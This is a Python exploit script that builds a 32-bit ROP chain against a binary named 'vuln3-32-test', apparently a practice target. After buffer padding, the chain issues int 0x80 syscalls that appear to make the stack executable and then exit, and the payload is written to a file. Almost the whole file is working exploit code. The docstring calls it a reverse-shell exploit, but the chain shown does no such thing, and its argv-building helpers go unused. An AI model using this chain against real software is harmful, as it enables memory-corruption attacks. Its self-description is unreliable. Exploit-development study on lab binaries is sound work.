import junk_length_and_addresses
import address_pop
from struct import pack
import exploit_gadgets

binary_name = "vuln3-32-test"

rop = exploit_gadgets.ROPgadgets(binary_name)
# Macro definitions for ROP Gadgets
POPEDX    = pack('<I', rop.get_gadget("pop edx ; ret")) # pop edx ; ret
POPEAX    = pack('<I', rop.get_gadget("pop eax ; ret")) # pop eax ; ret
ADDEAXEDX = pack('<I', rop.get_gadget("add eax, edx ; ret")) # add eax, edx ; ret
ADDECXECX = pack('<I', rop.get_gadget("add ecx, ecx ; ret"))
ADDEAXECX = pack('<I', rop.get_gadget("add eax, ecx ; ret"))

MOVISTACK = pack('<I', rop.get_gadget("mov dword ptr [edx], eax ; ret")) # mov dword ptr [edx], eax ; ret
XOREAX    = pack('<I', rop.get_gadget("xor eax, eax ; ret")) # xor eax, eax ; ret
INCEAX    = pack('<I', rop.get_gadget("inc eax ; ret")) # inc eax ; ret
INCEBX    = pack('<I', rop.get_gadget("inc ebx ; ret")) # inc ebx ; ret

INCECX    = pack('<I', rop.get_gadget("inc ecx ; ret")) # inc ecx ; ret
INCEDX    = pack('<I', rop.get_gadget("inc edx ; ret")) # inc edx ; ret
DECEDX    = pack('<I', rop.get_gadget("dec edx ; ret")) # dec edx ; ret
INT80     = pack('<I', 0x0806f7c0) # int 0x80
NOP       = pack('<I', rop.get_gadget("nop ; ret")) # nop
POPEBX    = pack('<I', rop.get_gadget("pop ebx ; ret")) # pop ebx ; ret
POPECXEBX = pack('<I', rop.get_gadget("pop ecx ; pop ebx ; ret")) # pop ecx ; pop ebx ; ret


def preprocess(p):
    """Helper function to preprocess command line arguments w.r.t. /

    :param p: The parameter to be preprocessed
    :return: The preprocessed command line argument
    """
    if '/' in p:
        result = ""
        subargs = p.split('/')
        for subarg in subargs:
            if subarg:
                while len(subarg) < 3:
                    subarg = '/' + subarg
                result += '/' + subarg
        return result
    return p


def create_stack_ropchain(cli_args, base_address):
    """Create the stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The stack ROP chain packed bytes sequence
    """
    p = b''

    offset = 0
    size = len(cli_args)
    for index in range(size):
        if index > 0:
            offset += len(cli_args[index - 1]) + 1
        
        for j in range(len(cli_args[index]) // 4):
            p += address_pop.pop_reg(base_address + offset + j * 4,POPEDX,0,DECEDX,"dec")

            p += POPEAX
            p += (cli_args[index][j * 4 : (j + 1) * 4]).encode('utf-8')
            p += MOVISTACK
        
        p += address_pop.pop_reg(base_address + offset + len(cli_args[index]),POPEDX,0,DECEDX,"dec")

        p += XOREAX
        p += MOVISTACK
    
    return p


def create_shadow_stack_ropchain(cli_args, base_address, shadow_stack_offset):
    """Create the shadow stack ROP chain

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :param shadow_stack_offset: The offset used from the .data address to create the shadow stack
    :return: The shadow stack ROP chain packed bytes sequence
    """
    p = b''

    args_offset = 0
    shadow_offset = 0
    size = len(cli_args)
    
    for index in range(size):
        p += address_pop.pop_reg(base_address + args_offset,POPEAX,POPEDX,ADDEAXEDX,"add")
        p += address_pop.pop_reg(base_address + shadow_stack_offset + shadow_offset,POPEDX,0,DECEDX,"dec")
        p += MOVISTACK

        shadow_offset += 4
        args_offset += len(cli_args[index]) + 1
    
    return p


def rop_exploit(base_address):
    """Create the full ROP chain reverse shell exploit

    :param cli_args: The command line arguments
    :param base_address: The base .data address
    :return: The full ROP chain reverse shell exploit packed bytes sequence
    """
    (padding, data, bss) = junk_length_and_addresses.get_everything(binary_name)
    data += 160 # now contains a null byte
    print(f"{data:x}")
    STACK     = pack('<I', data)
    exploit = b'\x41' * padding

    
    
    exploit += address_pop.doubadd(0x0000007D,ADDECXECX,INCECX)
    exploit += XOREAX # xor eax, eax ; ret
    exploit += ADDEAXECX
    exploit += address_pop.doubadd(0x00021000,ADDECXECX,INCECX)
    exploit += address_pop.pop_reg(0xfffdd000,POPEBX,0,INCEBX,"inc")

    exploit += address_pop.pop_reg(0xffffffff,POPEDX,0,DECEDX,"dec")
    exploit += INCEDX * 8
    exploit += INT80 # int 0x80
    exploit += XOREAX
    exploit += INCEAX
    exploit += INT80

    exploit += b'A' * 100
    return exploit


def test():
    fileName=input("Enter the file name: ")
    outfile=open(fileName, "wb")
    outfile.write(rop_exploit(0x080da060))
    outfile.close()


if __name__ == "__main__":
    test()